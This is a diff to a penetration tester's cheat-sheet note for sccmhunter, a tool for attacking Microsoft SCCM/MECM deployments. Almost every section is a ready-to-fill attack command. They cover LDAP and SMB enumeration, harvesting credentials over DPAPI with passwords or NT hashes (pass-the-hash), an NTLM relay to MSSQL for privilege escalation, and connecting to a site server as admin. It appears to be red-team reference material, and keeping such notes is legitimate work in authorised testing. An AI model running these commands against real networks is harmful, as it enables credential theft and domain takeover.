@@ -3,14 +3,20 @@
 % sccm, mecm
 #plateform/linux  #target/remote #cat/RECON 
 
-## desc
+## _url
 ```
 https://github.com/garrettfoster13/sccmhunter
-https://github.com/garrettfoster13/sccmhunter/wiki
+```
 
+## desc
+```
 .sccmhunter/logs/db/find.db
 to install set dependencies on last version (i.e remove version in requirements.txt)
+```
 
+## _links
+```
+https://github.com/garrettfoster13/sccmhunter/wiki
 ```
 
 ##  enum - ldap (creds)
@@ -30,7 +36,7 @@ KRB5CCNAME=<ccache>  python3 sccmhunter.py find -debug  -u <user> -no-pass -k -d
 
 ## enum - smb (creds)
 ```bash
-python3 sccmhunter.py smb -debug  -u <user> -p <password> -d <domain_fqdn> -dc-ip <dc_fqdn>
+python3 sccmhunter.py smb -debug  -u <user> -p <password> -d <domain_fqdn> -save -dc-ip <dc_fqdn>
 ```
 
 ## show - all
@@ -41,13 +47,13 @@ python3 sccmhunter.py show  -all
 
 #cat/ATTACK 
 
-## harvest naa - DPAPI (cred local admin)
+## harvest creds - DPAPI (cred local admin)
 ```bash
 python3 sccmhunter.py dpapi -debug  -u <user>  -p '<password>' -target <target_ip>
 ```
 
 
-## harvest naa - DPAPI (pth local admin)
+## harvest creds - DPAPI (pth local admin)
 ```bash
 python3 sccmhunter.py dpapi -debug  -u <user>  -hashes :<nt_hash> -target <target_ip>
 ```
@@ -60,4 +66,12 @@ python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> -m
 ## privesc - ntlmrelay to mssql helper
 ```bash
 python3 sccmhunter.py mssql -stacked -d <domain_fqdn -dc-ip <dc_fqdn> -tu <target_user> -sc <sccm_site_code> -u <user> -p '<password>'
+```
+
+#cat/POST
+
+
+## admin - connect
+```bash
+python3 sccmhunter.py admin -debug  -u <user> -p <password> -ip <site_server_target>
 ```
